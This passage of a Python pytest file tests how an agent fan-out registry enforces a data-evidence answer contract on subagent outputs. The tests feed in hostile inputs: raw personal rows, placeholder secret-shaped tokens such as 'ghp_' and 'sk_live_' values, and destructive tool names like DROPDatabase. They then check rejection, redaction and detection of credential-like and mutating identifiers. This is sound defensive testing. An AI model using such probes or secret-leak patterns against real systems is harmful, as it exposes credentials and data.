    lane: dict[str, Any] = {"lane_id": "data_context", "capability": "data_context"}
    lane.update(overrides)
    return lane


@pytest.mark.parametrize(
    ("label", "lane"),
    [
        ("no answer_contract at all", _data_lane()),
        (
            "a foreign contract_id",
            _data_lane(
                answer_contract={
                    "contract_id": "anything_goes.v1",
                    "response_model_schema": {"type": "object"},
                }
            ),
        ),
        ("an empty declaration", _data_lane(answer_contract={})),
    ],
)
def test_round67_data_lane_never_registers_unbound(
    tmp_path: Any,
    label: str,
    lane: dict[str, Any],
) -> None:
    """Absent or foreign metadata must not leave the data lane unenforced.

    The probe: submit raw rows, an email, and requires_user_confirmation=false.
    Before this, registration bound nothing in these cases, so re-entry
    returned `complete`, reported no violations, and persisted the content.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id=f"sess-67-{abs(hash(label))}",
        lanes=[lane],
    )
    assert fanout_id is not None

    record = registry.load(fanout_id)
    assert record is not None
    bound = record.synthesizer_input.get("lane_answer_contracts", {})
    assert "data_context" in bound, f"{label}: the data lane registered with nothing bound"
    assert bound["data_context"]["contract_id"] == "data_evidence_answer.v1"

    out = submit_fanout_results(
        registry,
        session_id=f"sess-67-{abs(hash(label))}",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": dict(_HOSTILE_DATA_OUTPUT)}],
        fanout_id=fanout_id,
    )

    assert out.get("contract_violations"), f"{label}: no violation reported"
    # An optional lane that fails its contract is simply missing, not fatal —
    # what must never happen is its content being accepted.
    assert "data_context" in (out.get("missing_optional_keys") or []), label
    assert "data_context" not in (out.get("received_keys") or []), label

    serialized = json.dumps(out, ensure_ascii=False, default=str)
    assert "alice@example.com" not in serialized
    assert "010-1234-5678" not in serialized

    stored = registry.load(fanout_id)
    assert stored is not None
    assert not stored.received_results, f"{label}: hostile content reached durable state"


@pytest.mark.parametrize(
    ("label", "lane"),
    [
        ("no answer_contract at all", _data_lane(required=True)),
        (
            "a foreign contract_id",
            _data_lane(
                required=True,
                answer_contract={
                    "contract_id": "anything_goes.v1",
                    "response_model_schema": {"type": "object"},
                },
            ),
        ),
    ],
)
def test_round67_required_data_lane_stays_partial_until_conforming(
    tmp_path: Any,
    label: str,
    lane: dict[str, Any],
) -> None:
    """When the lane is required, hostile content cannot complete the fan-out."""
    registry = FanoutRegistry(tmp_path)
    session = f"sess-67-req-{abs(hash(label))}"
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id=session, lanes=[lane]
    )
    assert fanout_id is not None

    out = submit_fanout_results(
        registry,
        session_id=session,
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": dict(_HOSTILE_DATA_OUTPUT)}],
        fanout_id=fanout_id,
    )

    assert out["status"] == "partial", label
    assert "data_context" in out["missing_required_keys"], label
    assert out.get("contract_violations"), label


def test_round67_conforming_data_lane_still_completes(tmp_path: Any) -> None:
    """Binding by identity must not block the ordinary, conforming lane."""
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-67-ok",
        lanes=[_data_lane(required=True)],
    )
    assert fanout_id is not None

    out = submit_fanout_results(
        registry,
        session_id="sess-67-ok",
        correlation_key="context.lane_id",
        results=[
            {
                "key": "data_context",
                "content": {
                    "lane_id": "data_context",
                    "data_needed": False,
                    "finding": "This question does not depend on data evidence.",
                    "confidence": "no_evidence",
                    "evidence": [],
                    "proposed_queries": [],
                    "requires_user_confirmation": True,
                },
            }
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete", out.get("contract_violations")


def test_round67_published_contract_equals_the_bound_one(tmp_path: Any) -> None:
    """Advertised IFF enforced, for every declaration a caller can write.

    Deciding separately on the two surfaces is how the lane came to publish a
    canonical contract it had not bound.
    """
    from ouroboros.mcp.tools.subagent import (
        effective_lane_contract,
        published_lane_contract_fields,
    )

    declarations = [
        None,
        {},
        {"contract_id": "anything_goes.v1", "response_model_schema": {"type": "object"}},
        {"contract_id": "data_evidence_answer.v1", "response_model_schema": {"type": "object"}},
    ]
    for declared in declarations:
        published = published_lane_contract_fields(declared or {}, "data_context")
        bound = effective_lane_contract("data_context", declared)
        assert bound is not None
        assert published["answer_contract"] == bound, declared

    # A non-data lane keeps the existing behaviour: declared or nothing.
    assert effective_lane_contract("code_context", None) is None


# --------------------------------------------------------------------------- #
# round-69 — an unknown identifier is caller text, and a lifecycle status
# --------------------------------------------------------------------------- #


def test_round69_unknown_identifier_is_digested_not_echoed(tmp_path: Any) -> None:
    """A grammar-valid id can still be a secret.

    Round 64 bounded the id's LENGTH, and I argued from that bound that
    echoing a well-formed one was safe. `ghp_abcdef1234567890` satisfies the
    grammar: the harm is the content, not the size, and an unknown id is by
    definition one the registry never issued.
    """
    secret = "ghp_abcdef1234567890"

    out = submit_fanout_results(
        FanoutRegistry(tmp_path),
        session_id="s",
        correlation_key="context.persona",
        results=[],
        fanout_id=secret,
    )

    assert out["status"] == "unknown_fanout_id"
    serialized = json.dumps(out, ensure_ascii=False, default=str)
    assert secret not in serialized
    # Still correlatable — the digest is stable, which is what the echo was for.
    assert out["fanout_id"].startswith("<redacted-key sha256:")
    again = submit_fanout_results(
        FanoutRegistry(tmp_path),
        session_id="s",
        correlation_key="context.persona",
        results=[],
        fanout_id=secret,
    )
    assert again["fanout_id"] == out["fanout_id"]
    # And two different ids stay distinguishable.
    other = submit_fanout_results(
        FanoutRegistry(tmp_path),
        session_id="s",
        correlation_key="context.persona",
        results=[],
        fanout_id="fanout-that-expired-42",
    )
    assert other["fanout_id"] != out["fanout_id"]


@pytest.mark.asyncio
async def test_round69_unknown_fanout_id_survives_as_a_structured_status(
    tmp_path: Any,
) -> None:
    """The advertised lifecycle status must reach the host, not become an error.

    Raising it made the transport drop the outcome metadata and surface a
    plain exception, so a host could not tell an expired record from a tool
    failure — which is the distinction the contract advertises.
    """
    handler = SubmitFanoutResultsHandler(fanout_registry=FanoutRegistry(tmp_path))

    result = await handler.handle(
        {
            "fanout_id": "fanout-that-never-existed",
            "session_id": "s",
            "correlation_key": "context.persona",
            "results": [],
        }
    )

    assert result.is_ok, "the lifecycle status was raised instead of returned"
    payload = result.value
    assert payload.is_error is True
    assert payload.meta["status"] == "unknown_fanout_id"
    assert json.loads(payload.content[0].text)["status"] == "unknown_fanout_id"


# --------------------------------------------------------------------------- #
# round-70 — a reserved contract id means exactly one thing
# --------------------------------------------------------------------------- #


_RAW_PERSON_ROWS = {
    "rows": [
        {"name": "Alice Kim", "email": "alice@example.com", "phone": "010-1234-5678"},
        {"name": "Bob Lee", "email": "bob@example.com", "phone": "010-8765-4321"},
    ]
}

_WEAK_DATA_DECLARATION = {
    "contract_id": "data_evidence_answer.v1",
    "response_model_schema": {"type": "object"},
}


def test_round70_foreign_lane_cannot_borrow_the_data_contract_id(tmp_path: Any) -> None:
    """The id carries its schema, whatever lane_id declares it.

    Round 67 bound the canonical schema by LANE ID, but the boundary scan,
    retained-state selection, prose redaction, and replay consent all key off
    CONTRACT ID. So an additive lane under another lane_id could declare
    `data_evidence_answer.v1` with `{"type": "object"}` and be treated as a
    data lane everywhere except where its content was checked.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-70",
        lanes=[
            {
                "lane_id": "extra_metrics_lane",
                "capability": "call_mcp",
                "required": True,
                "answer_contract": dict(_WEAK_DATA_DECLARATION),
            }
        ],
    )
    assert fanout_id is not None

    record = registry.load(fanout_id)
    assert record is not None
    bound = record.synthesizer_input["lane_answer_contracts"]["extra_metrics_lane"]
    assert bound["response_model_schema"] != _WEAK_DATA_DECLARATION["response_model_schema"]
    assert "$defs" in bound["response_model_schema"]

    out = submit_fanout_results(
        registry,
        session_id="sess-70",
        correlation_key="context.lane_id",
        results=[{"key": "extra_metrics_lane", "content": dict(_RAW_PERSON_ROWS)}],
        fanout_id=fanout_id,
    )

    assert out["status"] == "partial"
    assert out.get("contract_violations")
    serialized = json.dumps(out, ensure_ascii=False, default=str)
    assert "alice@example.com" not in serialized
    assert "010-1234-5678" not in serialized
    assert not registry.load(fanout_id).received_results


def test_round70_a_legacy_record_cannot_enforce_less(tmp_path: Any) -> None:
    """A record persisted before round-70 is normalized when it is read back.

    Registration cannot be the only place this holds — an old record carrying
    a weak contract under the reserved id is read on every submission.
    """
    registry = FanoutRegistry(tmp_path)
    record = FanoutRecord(
        fanout_id="legacy-70",
        kind=FANOUT_KIND_QUESTION_ADVISORY,
        session_id="sess-70-legacy",
        correlation_key="context.lane_id",
        expected_keys=("extra_metrics_lane",),
        required_keys=("extra_metrics_lane",),
        synthesizer_input={
            "lane_ids": ["extra_metrics_lane"],
            # Persisted by an older version, before the id carried its schema.
            "lane_answer_contracts": {"extra_metrics_lane": dict(_WEAK_DATA_DECLARATION)},
        },
    )
    assert bool(registry.save(record))

    out = submit_fanout_results(
        registry,
        session_id="sess-70-legacy",
        correlation_key="context.lane_id",
        results=[{"key": "extra_metrics_lane", "content": dict(_RAW_PERSON_ROWS)}],
        fanout_id="legacy-70",
    )

    assert out["status"] == "partial"
    assert out.get("contract_violations")
    assert "alice@example.com" not in json.dumps(out, ensure_ascii=False, default=str)


def test_round70_an_unrelated_lane_contract_is_untouched(tmp_path: Any) -> None:
    """Only the RESERVED id is normalized — additive lanes keep their own form."""
    from ouroboros.mcp.tools.subagent import effective_lane_contract, loaded_lane_contracts

    own = {
        "contract_id": "code_facts.v3",
        "response_model_schema": {"type": "object", "properties": {"note": {"type": "string"}}},
    }
    assert effective_lane_contract("code_context", own) == own
    assert loaded_lane_contracts({"code_context": own})["code_context"] == own


def test_round70_a_conforming_borrowed_lane_still_completes(tmp_path: Any) -> None:
    """Binding the id must not block a lane that genuinely answers in its form."""
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-70-ok",
        lanes=[
            {
                "lane_id": "extra_metrics_lane",
                "capability": "call_mcp",
                "required": True,
                "answer_contract": dict(_WEAK_DATA_DECLARATION),
            }
        ],
    )
    assert fanout_id is not None

    out = submit_fanout_results(
        registry,
        session_id="sess-70-ok",
        correlation_key="context.lane_id",
        results=[
            {
                "key": "extra_metrics_lane",
                "content": {
                    "lane_id": "data_context",
                    "data_needed": False,
                    "finding": "This question does not depend on data evidence.",
                    "confidence": "no_evidence",
                    "evidence": [],
                    "proposed_queries": [],
                    "requires_user_confirmation": True,
                },
            }
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete", out.get("contract_violations")


# --------------------------------------------------------------------------- #
# round-71 — one resolution, reached from all three surfaces
# --------------------------------------------------------------------------- #


def test_round71_publication_matches_what_registration_binds(tmp_path: Any) -> None:
    """A child must be shown the contract re-entry will actually enforce.

    A foreign lane declaring the reserved id was PUBLISHED its own weak
    schema while registration bound the canonical one, so a child that
    followed the advertised contract was rejected and a required lane stayed
    permanently partial.
    """
    from ouroboros.mcp.tools.subagent import (
        effective_lane_contract,
        published_lane_contract_fields,
    )

    for lane_id in ("data_context", "extra_metrics_lane"):
        published = published_lane_contract_fields(dict(_WEAK_DATA_DECLARATION), lane_id)
        bound = effective_lane_contract(lane_id, dict(_WEAK_DATA_DECLARATION))
        assert bound is not None
        assert published["answer_contract"] == bound, lane_id
        assert published["answer_contract"]["response_model_schema"] != {"type": "object"}


def test_round71_prompt_advertises_the_enforced_contract() -> None:
    """The same decision has to reach the rendered prompt, not just the payload."""
    payloads = build_interview_question_advisory_subagents(
        {
            "session_id": "sess-71",
            "question_identity": "interview-question:00112233445566bb",
            "question": "How many enterprise accounts churned last quarter?",
            "user_question_first": True,
            "lanes": [
                {
                    "lane_id": "extra_metrics_lane",
                    "capability": "call_mcp",
                    "required": True,
                    "answer_contract": dict(_WEAK_DATA_DECLARATION),
                }
            ],
        }
    )
    assert payloads
    published = payloads[0].context["answer_contract"]
    assert published["response_model_schema"] != {"type": "object"}
    assert "$defs" in published["response_model_schema"]


def test_round71_legacy_data_lane_without_a_contract_is_not_fail_open(tmp_path: Any) -> None:
    """A record predating the binding is resolved from the lane it EXPECTS.

    Round 70 normalized only an existing reserved id, so a legacy
    `data_context` lane whose contract was absent — or named something else —
    stayed unbound and accepted raw rows.
    """
    registry = FanoutRegistry(tmp_path)
    for label, stored in (
        ("absent", {}),
        ("foreign id", {"data_context": {"contract_id": "anything.v1"}}),
    ):
        fanout_id = f"legacy-71-{label.replace(' ', '-')}"
        record = FanoutRecord(
            fanout_id=fanout_id,
            kind=FANOUT_KIND_QUESTION_ADVISORY,
            session_id="sess-71-legacy",
            correlation_key="context.lane_id",
            expected_keys=("data_context",),
            required_keys=("data_context",),
            synthesizer_input={"lane_ids": ["data_context"], "lane_answer_contracts": stored},
        )
        assert bool(registry.save(record)), label

        out = submit_fanout_results(
            registry,
            session_id="sess-71-legacy",
            correlation_key="context.lane_id",
            results=[{"key": "data_context", "content": dict(_HOSTILE_DATA_OUTPUT)}],
            fanout_id=fanout_id,
        )

        assert out["status"] == "partial", label
        assert out.get("contract_violations"), label
        serialized = json.dumps(out, ensure_ascii=False, default=str)
        assert "alice@example.com" not in serialized, label
        assert not registry.load(fanout_id).received_results, label


# --------------------------------------------------------------------------- #
# round-71 — the invariant itself, not one instance of it
# --------------------------------------------------------------------------- #


_CONTRACT_DECLARATIONS: list[tuple[str, Any]] = [
    ("absent", None),
    ("empty", {}),
    ("reserved id, weak schema", dict(_WEAK_DATA_DECLARATION)),
    ("reserved id, canonical", None),  # filled in below
    (
        "foreign id, enforceable",
        {
            "contract_id": "future_additive.v1",
            "response_model_schema": {"type": "object", "properties": {"note": {"type": "string"}}},
        },
    ),
    (
        "foreign id, broken $ref",
        {
            "contract_id": "future_ref.v1",
            "response_model_schema": {
                "type": "object",
                "properties": {"payload": {"$ref": "#/$defs/missing_definition"}},
            },
        },
    ),
]


@pytest.mark.parametrize("lane_id", ["data_context", "extra_metrics_lane", "code_context"])
@pytest.mark.parametrize(("label", "declared"), _CONTRACT_DECLARATIONS)
def test_round71_registration_and_publication_never_disagree(
    lane_id: str,
    label: str,
    declared: Any,
) -> None:
    """Every surface that resolves a lane contract must resolve it the same.

    Rounds 67, 70 and 71 were one decision reaching three surfaces, one round
    each, because the consistency check was written over the instance being
    fixed rather than over the invariant. This is the invariant: for every
    lane id and every declaration a caller can write, what is published is
    what is bound.
    """
    from ouroboros.mcp.tools.subagent import (
        UNENFORCED_CONTRACT_FIELD,
        effective_lane_contract,
        published_lane_contract_fields,
    )

    if label == "reserved id, canonical":
        declared = canonical_data_lane_contract()

    bound = effective_lane_contract(lane_id, declared)
    published = published_lane_contract_fields(declared or {}, lane_id)

    if bound is None:
        # Nothing is enforced, and the metadata must say exactly that rather
        # than advertise a form re-entry ignores. What "that" is depends on
        # whether anything was DECLARED (round-74): an unenforced notice
        # exists to warn about a declared form that will not be enforced —
        # about a declaration that never existed it would be its own lie.
        assert "answer_contract" not in published, (lane_id, label)
        if declared:
            assert UNENFORCED_CONTRACT_FIELD in published, (lane_id, label)
        else:
            assert published == {}, (lane_id, label)
    else:
        assert published.get("answer_contract") == bound, (lane_id, label)
        assert UNENFORCED_CONTRACT_FIELD not in published, (lane_id, label)

    # And the data lane is bound whatever it declared.
    if lane_id == "data_context":
        assert bound == canonical_data_lane_contract(), label


def test_round74_undeclared_data_lane_publishes_its_bound_contract() -> None:
    """Transport parity for the lane that declared nothing.

    Registration binds the canonical contract by identity and the prompt says
    so, but payload.context published nothing because publication was gated
    on an existing declaration — so a context-driven consumer submitted the
    generic shape re-entry rejects.
    """
    payloads = build_interview_question_advisory_subagents(
        {
            "session_id": "sess-74",
            "question_identity": "interview-question:00112233445566cc",
            "question": "How many enterprise accounts churned last quarter?",
            "user_question_first": True,
            "lanes": [{"lane_id": "data_context", "capability": "data_context", "required": False}],
        }
    )
    assert payloads
    context = payloads[0].context
    assert context["answer_contract"] == canonical_data_lane_contract()


def test_round74_undeclared_generic_lane_publishes_nothing() -> None:
    """No declaration and no identity contract → no contract fields at all.

    An "unenforced" notice about a declaration that never existed would be
    its own lie; the generic output shape applies.
    """
    from ouroboros.mcp.tools.subagent import (
        UNENFORCED_CONTRACT_FIELD,
        published_lane_contract_fields,
    )

    published = published_lane_contract_fields(None, "code_context")
    assert published == {}
    assert UNENFORCED_CONTRACT_FIELD not in published


# --------------------------------------------------------------------------- #
# round-75 — every prompt surface renders the enforced contract; the plugin
# extraction transcript withholds observations
# --------------------------------------------------------------------------- #


def test_round75_plugin_extraction_transcript_withholds_observations() -> None:
    """The third extraction surface, after the in-process and PM extractors.

    The plugin Seed path formats the transcript for a child instructed to
    extract all requirements; the observation's content must not reach it.
    """
    from ouroboros.bigbang.interview import InterviewRound, InterviewState
    from ouroboros.core.requirement_candidate import OBSERVATION_WITHHELD_NOTE
    from ouroboros.mcp.tools.authoring_handlers import (
        _format_extraction_transcript,
        _format_interview_transcript,
    )

    state = InterviewState(
        interview_id="iv_75",
        initial_context="Build the reporting lane",
        rounds=[
            InterviewRound(
                round_number=1,
                question="What did the data show?",
                user_response=("[from-data] Confirmed: 42 enterprise accounts require SSO today."),
            ),
            InterviewRound(
                round_number=2,
                question="So what must the product guarantee?",
                user_response="Enterprise accounts must be able to use SSO.",
            ),
        ],
    )

    extraction = _format_extraction_transcript(state)
    assert "42 enterprise accounts" not in extraction
    assert "[from-data]" not in extraction
    assert OBSERVATION_WITHHELD_NOTE in extraction
    assert "Enterprise accounts must be able to use SSO." in extraction

    # The CONVERSATIONAL transcript keeps the full history: the child helping
    # the user answer legitimately sees the observation.
    conversational = _format_interview_transcript(state)
    assert "42 enterprise accounts" in conversational


def test_round75_host_prompt_renders_the_enforced_contract() -> None:
    """A data lane declaring another enforceable contract is shown the
    canonical one — what the child is told is what re-entry does."""
    foreign_but_enforceable = {
        "contract_id": "other_form.v1",
        "response_model_schema": {
            "type": "object",
            "additionalProperties": False,
            "properties": {"note": {"type": "string", "maxLength": 40, "pattern": "^[a-z ]+$"}},
        },
    }
    payloads = build_interview_question_advisory_subagents(
        {
            "session_id": "sess-75",
            "question_identity": "interview-question:00112233445566dd",
            "question": "How many enterprise accounts churned last quarter?",
            "user_question_first": True,
            "lanes": [
                {
                    "lane_id": "data_context",
                    "capability": "data_context",
                    "required": False,
                    "answer_contract": foreign_but_enforceable,
                }
            ],
        }
    )
    assert payloads
    prompt = payloads[0].prompt
    assert "other_form.v1" not in prompt.split("## Answer Contract")[1]
    assert "data_evidence_answer.v1" in prompt
    assert '"$defs"' in prompt or "$defs" in prompt


def test_round75_generic_prompt_renders_canonical_for_borrowed_id() -> None:
    """An additive lane declaring the reserved id sees the canonical schema,
    matching what re-entry enforces (round-70 binding)."""
    payloads = build_interview_question_advisory_subagents(
        {
            "session_id": "sess-75b",
            "question_identity": "interview-question:00112233445566ee",
            "question": "Which module owns retries?",
            "user_question_first": True,
            "lanes": [
                {
                    "lane_id": "extra_metrics_lane",
                    "capability": "call_mcp",
                    "required": False,
                    "answer_contract": dict(_WEAK_DATA_DECLARATION),
                }
            ],
        }
    )
    assert payloads
    prompt = payloads[0].prompt
    assert '{"type": "object"}' not in prompt
    assert "aggregation" in prompt  # canonical schema field, not the weak declaration


def test_round75_plugin_contract_section_covers_the_undeclared_data_lane() -> None:
    """The plugin prompt runs the same decision even with NO declaration —
    the parity gap round 74 closed on payload.context, closed here too."""
    from ouroboros.mcp.tools.subagent import _plugin_advisory_contract_section

    section = _plugin_advisory_contract_section(
        "fanout_75",
        {"lanes": [{"lane_id": "data_context", "capability": "data_context"}]},
        "sess-75c",
    )
    assert "data_evidence_answer.v1" in section
    assert "OMITTED" not in section


def test_round76_rejected_secret_scope_key_is_not_echoed(tmp_path: Any) -> None:
    """A value rejected FOR BEING secret-shaped may not ride the rejection.

    The probe: filters=["sk_live_1234_name=smith"] was refused, and the same
    secret appeared verbatim in contract_violations and in the persisted
    terminal record. Same class as the round-69 fanout_id echo, one layer in.
    """
    secret_scope = "sk_live_1234_name=smith"
    output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Scoped count requested.",
        "confidence": "reported_by_tool",
        "evidence": [
            {
                "source": "warehouse",
                "request": {
                    "operation": "read",
                    "metric": "logins",
                    "aggregation": "count",
                    "filters": [secret_scope],
                },
                "value": {"number": 3},
                "observed_at": "2026-07-25T00:00:00Z",
                "execution_status": "succeeded",
            }
        ],
        "proposed_queries": [],
        "caveats": ["point-in-time"],
        "requires_user_confirmation": True,
    }

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-76",
        lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
    )
    assert fanout_id is not None

    out = submit_fanout_results(
        registry,
        session_id="sess-76",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": output}],
        fanout_id=fanout_id,
    )

    assert out.get("contract_violations"), "the secret-shaped scope was accepted"
    serialized = json.dumps(out, ensure_ascii=False, default=str)
    assert "sk_live_1234" not in serialized
    assert "smith" not in serialized

    record = registry.load(fanout_id)
    assert record is not None
    persisted = json.dumps(record.to_dict(), ensure_ascii=False, default=str)
    assert "sk_live_1234" not in persisted


# --------------------------------------------------------------------------- #
# round-77 — the published grammar is honored: safe identifiers pass
# --------------------------------------------------------------------------- #


def _round77_answer(metric: str, filters: list[str]) -> dict[str, Any]:
    return {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Usage counted for the requested scope.",
        "confidence": "reported_by_tool",
        "evidence": [
            {
                "source": "warehouse",
                "request": {
                    "operation": "read",
                    "metric": metric,
                    "aggregation": "count",
                    "filters": filters,
                },
                "value": {"number": 12},
                "observed_at": "2026-07-25T00:00:00Z",
                "execution_status": "succeeded",
            }
        ],
        "proposed_queries": [],
        "caveats": ["point-in-time"],
        "requires_user_confirmation": True,
    }


def test_round77_schema_valid_identifiers_complete_end_to_end(tmp_path: Any) -> None:
    """What the published grammar allows, re-entry accepts.

    `metric: "token_usage_v2"` and `filters: ["key_metrics_30d=active"]` have
    zero schema errors, yet the whole-JSON credential regexes rejected them —
    the scrub exempted only source and tool_name. A contradiction between
    the advertised grammar and enforcement permanently blocks a required
    lane: the child has no representable way to comply.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-77",
        lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
    )
    assert fanout_id is not None

    out = submit_fanout_results(
        registry,
        session_id="sess-77",
        correlation_key="context.lane_id",
        results=[
            {
                "key": "data_context",
                "content": _round77_answer("token_usage_v2", ["key_metrics_30d=active"]),
            }
        ],
        fanout_id=fanout_id,
    )

    assert out.get("contract_violations") in (None, []), out.get("contract_violations")
    assert out["status"] == "complete"


def test_round77_real_credentials_in_those_same_fields_still_fail(tmp_path: Any) -> None:
    """Widening the exemption must not widen the door.

    The exemption applies only to values that pass the field-aware guards;
    a credential wearing the field is still caught by them.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-77b",
        lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
    )
    assert fanout_id is not None

    out = submit_fanout_results(
        registry,
        session_id="sess-77b",
        correlation_key="context.lane_id",
        results=[
            {
                "key": "data_context",
                "content": _round77_answer("logins", ["api_key=sk_live_abc123"]),
            }
        ],
        fanout_id=fanout_id,
    )

    assert out["status"] == "partial"
    assert out.get("contract_violations")
    serialized = json.dumps(out, ensure_ascii=False, default=str)
    assert "sk_live_abc123" not in serialized


# --------------------------------------------------------------------------- #
# round-78 — camel boundaries are boundaries; one metric grammar
# --------------------------------------------------------------------------- #


def test_round78_acronym_prefixed_mutators_are_caught(tmp_path: Any) -> None:
    """DROPDatabase and EXECQuery are mutators wearing an acronym.

    The tokenizer split lower-to-upper but not acronym-to-word, so an upper
    RUN followed by a capitalized word stayed one token and the verb was
    never seen — a retained known-data-tool named DROPDatabase completed
    re-entry as a proposal tool_name.
    """
    from ouroboros.contracts.data_evidence import _mutating_tool_verb

    assert _mutating_tool_verb("DROPDatabase") == "drop"
    assert _mutating_tool_verb("EXECQuery") == "exec"
    assert _mutating_tool_verb("TRUNCATETable") is not None
    # The boundary must not turn legitimate camel tool names into false hits.
    assert _mutating_tool_verb("BigQuery") is None
    assert _mutating_tool_verb("PostgreSQL") is None


def test_round78_camelcase_credentials_lose_the_exemption(tmp_path: Any) -> None:
    """apiKeyHunterTwo is api_key_hunter_two wearing camelCase.

    Splitting only on -_. left it one token, no credential word was seen,
    and the identifier exemption removed it from the whole-output scan — a
    schema-valid required lane returned it unchanged.
    """
    from ouroboros.contracts.data_evidence import _identifier_looks_secret

    assert _identifier_looks_secret("apiKeyHunterTwo")
    assert _identifier_looks_secret("clientSecretHunterTwo")
    # And the exemption still holds for what rounds 29-57 deliberately allow.
    assert not _identifier_looks_secret("token_usage_v2")
    assert not _identifier_looks_secret("key_metrics_30d")
    assert not _identifier_looks_secret("BigQuery")


def test_round78_metric_grammar_is_advertised_iff_enforced() -> None:
    """One pattern, derived once, on both surfaces.

    password_resets was schema-valid yet rejected by enforcement — a child
    holding a zero-error answer had no way to comply. The resolution
    CONSTRAINS the grammar (the reviewer's second option): distinguishing
    password_resets from round-45's password_swordfish by shape is not
    decidable, so the advertised pattern now refuses absolute credential
    words and camelCase, and what the schema admits, re-entry accepts.
    """
    from ouroboros.contracts.data_evidence import (
        _READ_REQUEST_METRIC,
        _data_context_answer_contract,
    )

    published = _data_context_answer_contract()["response_model_schema"]["$defs"]["read_request"][
        "properties"
    ]["metric"]["pattern"]
    assert published == _READ_REQUEST_METRIC.pattern

    # Refused by the ADVERTISED grammar, not accepted-then-rejected.
    for refused in ("password_resets", "apiKeyHunterTwo", "secret_rotations"):
        assert not _READ_REQUEST_METRIC.match(refused), refused
    for admitted in ("token_usage_v2", "logins", "key_metrics_30d", "api.requests-total"):
        assert _READ_REQUEST_METRIC.match(admitted), admitted


# --------------------------------------------------------------------------- #
# round-79 — one case rule for vendor prefixes; the metric grammar absorbs
# the classifier
# --------------------------------------------------------------------------- #


def test_round79_uppercase_vendor_prefix_is_caught_at_both_layers(
    tmp_path: Any,
    monkeypatch: Any,
) -> None:
    """GHP_abc12345 is ghp_abc12345 shouting.

    The vendor-prefix classifier was case-sensitive while the whole-output
    scan is deliberately case-insensitive, so the uppercase form passed the
    config filter into known_data_tools AND completed re-entry as an
    evidence source, returned intact.
    """
    from ouroboros.contracts.data_evidence import _identifier_looks_secret
    from ouroboros.mcp.tools.authoring_handlers import (
        _advisory_lanes_with_known_data_tools,
    )

    assert _identifier_looks_secret("GHP_abc12345")
    assert _identifier_looks_secret("ghp_abc12345")

    # Layer 1 — configuration dispatch: the hostile hint never reaches lanes.
    monkeypatch.setenv("OUROBOROS_KNOWN_DATA_TOOLS", "GHP_abc12345,clickhouse_query")
    lanes = _advisory_lanes_with_known_data_tools(
        {"lanes": [{"lane_id": "data_context", "capability": "data_context"}]}
    )
    tools = next(
        (lane.get("known_data_tools") for lane in lanes if lane.get("lane_id") == "data_context"),
        None,
    )
    assert tools == ["clickhouse_query"]

    # Layer 2 — handler re-entry: the same value as an evidence source fails
    # and is not echoed.
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-79",
        lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
    )
    assert fanout_id is not None
    answer = _round77_answer("logins", [])
    answer["evidence"][0]["source"] = "GHP_abc12345"
    out = submit_fanout_results(
        registry,
        session_id="sess-79",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": answer}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out.get("contract_violations")
    assert "GHP_abc12345" not in json.dumps(out, ensure_ascii=False, default=str)


def test_round79_every_schema_valid_metric_is_attainable(tmp_path: Any) -> None:
    """The metric grammar and the enforcement can no longer disagree.

    primary_key_count validated against the schema while the classifier
    rejected it ("key" qualified by a preceding token) — a required lane
    stayed partial holding a zero-error answer. The grammar now encodes the
    classifier's whole metric rule set and the metric path trusts the
    grammar, so the disagreement is unrepresentable: what the schema admits
    completes, and the qualified forms are refused by the ADVERTISED grammar.
    """
    from ouroboros.contracts.data_evidence import _READ_REQUEST_METRIC

    # Refused by the grammar itself — never accepted-then-rejected.
    for refused in ("primary_key_count", "refresh_token_alphabetic", "token_live_x"):
        assert not _READ_REQUEST_METRIC.match(refused), refused

    # And an admitted metric completes end-to-end, including the leading
    # qualifiable forms rounds 36-57 deliberately allow.
    for index, admitted in enumerate(("token_usage_v2", "key_metrics_30d", "logins")):
        registry = FanoutRegistry(tmp_path / str(index))
        fanout_id = register_question_advisory_fanout_from_lanes(
            registry,
            session_id=f"sess-79-{index}",
            lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
        )
        assert fanout_id is not None
        out = submit_fanout_results(
            registry,
            session_id=f"sess-79-{index}",
            correlation_key="context.lane_id",
            results=[{"key": "data_context", "content": _round77_answer(admitted, [])}],
            fanout_id=fanout_id,
        )
        assert out["status"] == "complete", (admitted, out.get("contract_violations"))


def test_round80_compact_date_partitions_complete_end_to_end(tmp_path: Any) -> None:
    """Calendar validity, not a key vocabulary, decides a digit partition.

    month=202607 and date=20260725 validate against the published grammar but
    were rejected as opaque entity identifiers — a required lane stayed
    partial holding a schema-valid answer.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-80",
        lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
    )
    assert fanout_id is not None

    out = submit_fanout_results(
        registry,
        session_id="sess-80",
        correlation_key="context.lane_id",
        results=[
